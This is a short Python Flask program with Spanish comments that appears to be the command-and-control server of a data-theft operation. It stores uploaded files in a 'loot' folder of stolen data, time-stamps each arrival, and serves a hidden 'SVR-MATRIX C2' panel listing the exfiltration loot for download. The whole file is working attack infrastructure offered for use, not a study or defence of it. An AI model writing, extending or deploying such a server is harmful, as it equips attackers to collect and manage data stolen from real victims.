from flask import Flask, request, send_from_directory, render_template_string
import os
import datetime

app = Flask(__name__)
# Directorio de almacenamiento de datos robados
UPLOAD_FOLDER = 'loot'
if not os.path.exists(UPLOAD_FOLDER): os.makedirs(UPLOAD_FOLDER)

@app.route('/svr_upload', methods=['POST'])
def upload():
    if 'file' not in request.files: return "ERR", 400
    file = request.files['file']
    # Le ponemos un prefijo de tiempo para saber cuándo cayó
    filename = f"{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}_{file.filename}"
    file.save(os.path.join(UPLOAD_FOLDER, filename))
    return "OK", 200

@app.route('/panel-secreto-svr')
def panel():
    files = sorted(os.listdir(UPLOAD_FOLDER), reverse=True)
    li_items = "".join([f"<li style='margin:10px 0; border-bottom:1px solid #1a1a1a; padding:5px;'><a href='/download/{f}' style='color:#00ff00; text-decoration:none;'>[⬇️ DOWNLOAD] {f}</a></li>" for f in files])
    
    return f"""
    <html>
    <head><title>SVR-MATRIX C2</title></head>
    <body style='background:#050505; color:#00ff00; font-family:monospace; padding:30px;'>
        <h2 style='border:1px solid #00ff00; padding:10px; text-align:center;'>🛰️ SVR-MATRIX: DATA CENTER CONTROL</h2>
        <hr style='border:1px solid #00ff00;'>
        <div style='background:#111; padding:20px; border-radius:10px;'>
            <h3>📦 BOTÍN DE EXFILTRACIÓN:</h3>
            <ul style='list-style:none; padding:0;'>{li_items or '<li>Esperando transmisión de datos...</li>'}</ul>
        </div>
        <footer style='margin-top:50px; font-size:10px; color:#444;'>SVR-CORE v15.0 | BY ARQUITECTO SUPREMO</footer>
    </body>
    </html>
    """

@app.route('/download/<filename>')
def download(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
